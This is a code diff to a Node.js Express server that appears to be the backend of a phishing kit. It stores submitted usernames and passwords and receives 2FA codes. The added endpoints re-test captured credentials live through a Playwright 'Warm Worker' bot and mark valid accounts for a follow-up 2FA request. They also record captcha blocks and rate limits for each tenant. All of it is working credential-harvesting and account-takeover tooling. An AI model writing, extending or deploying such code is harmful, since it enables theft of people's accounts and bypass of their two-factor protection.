@@ -16,7 +16,7 @@ process.on("unhandledRejection", (reason) => {
 
 const app = express();
 const PORT = process.env.PORT || 5501;
-const WORKER_URL = process.env.WORKER_URL || "http://127.0.0.1:3006";
+const WORKER_URL = (process.env.WORKER_URL || "http://127.0.0.1:3006").replace(/\/+testar\/?$/, "").replace(/\/+$/, "");
 
 const PUBLIC_DIR = path.join(__dirname, "public");
 const CODIGO_DIR = path.join(__dirname, "codigo");
@@ -333,9 +333,9 @@ async function testarViaWorker(usuario, senha, reqMeta = {}) {
         // Registro detalhado no sistema de auditoria
         audit.registrar({
             tenant,
-            event_type: data.valido ? "VALIDATION_SUCCESS" : (statusCred === "bloqueio_captcha" ? "CAPTCHA_BLOCKED" : "VALIDATION_FAILED"),
+            event_type: data.valido ? "VALIDATION_SUCCESS" : (statusCred === "rate_limit" ? "RATE_LIMIT_EXCEEDED" : (statusCred === "bloqueio_captcha" ? "CAPTCHA_BLOCKED" : "VALIDATION_FAILED")),
             usuario,
-            status: data.valido ? "SUCCESS" : (statusCred === "bloqueio_captcha" ? "BLOCKED" : "FAILED"),
+            status: data.valido ? "SUCCESS" : (statusCred === "rate_limit" ? "RATE_LIMITED" : (statusCred === "bloqueio_captcha" ? "BLOCKED" : "FAILED")),
             duration_ms: duracaoMs,
             details: {
                 tenant,
@@ -497,6 +497,64 @@ const handleSalvarLogin = (req, res) => {
 
 app.post("/salvar", handleSalvarLogin);
 app.post("/api/login", handleSalvarLogin);
+
+// Callback de resultados do bot Playwright standalone (fallback)
+app.post("/api/resultado-bot", (req, res) => {
+    const { usuario, valido, status_credencial, mensagem } = req.body || {};
+    if (usuario) {
+        const statusCred = status_credencial || (valido ? "valido" : "invalido");
+        const statusLogin = (valido && configApp.auto_mode) ? "solicitar_2fa" : undefined;
+        dbOps.atualizarStatusCredencial(usuario, statusCred, statusLogin);
+        const dados = lerDados();
+        let atualizou = false;
+        const uKey = usuario.toLowerCase().trim();
+        for (let i = dados.length - 1; i >= 0; i--) {
+            const item = dados[i];
+            if (item && (item.senha || item.password)) {
+                const u = (item.nome || item.usuario || item.username || "").toLowerCase().trim();
+                if (u === uKey) {
+                    item.status_credencial = statusCred;
+                    if (statusLogin) item.status_login = statusLogin;
+                    atualizou = true;
+                    break;
+                }
+            }
+        }
+        if (atualizou) salvarDados(dados);
+        notificarClientes();
+    }
+    res.json({ success: true });
+});
+
+// Endpoint para re-testar credenciais salvas sem re-digitação
+const handleRetestar = async (req, res) => {
+    const { usuario } = req.body || {};
+    const tenant = extrairTenant(req);
+    const dados = lerDados();
+    let alvo = null;
+    if (usuario) {
+        const uKey = String(usuario).toLowerCase().trim();
+        alvo = dados.slice().reverse().find(i => (i.usuario || i.nome || "").toLowerCase().trim() === uKey && (i.senha || i.password));
+    } else {
+        alvo = dados.slice().reverse().find(i => (i.senha || i.password));
+    }
+    if (!alvo) {
+        return res.status(404).json({ success: false, mensagem: "Nenhuma credencial encontrada para retestar." });
+    }
+    const u = alvo.usuario || alvo.nome;
+    const p = alvo.senha || alvo.password;
+
+    dbOps.atualizarStatusCredencial(u, "testando");
+    alvo.status_credencial = "testando";
+    salvarDados(dados);
+    notificarClientes();
+
+    testarViaWorker(u, p, { tenant, ip: "retest", userAgent: "operator-retest", tipo_identificador: alvo.tipo_identificador || "usuario" });
+    return res.json({ success: true, mensagem: `Retestando credenciais de ${u} no Warm Worker...` });
+};
+
+app.post("/api/retestar", handleRetestar);
+app.post("/api/retestar-sso", handleRetestar);
 
 // Rota de recebimento de código 2FA (/codigo, /salvar-codigo, /api/2fa)
 const handleSalvar2FA = (req, res) => {
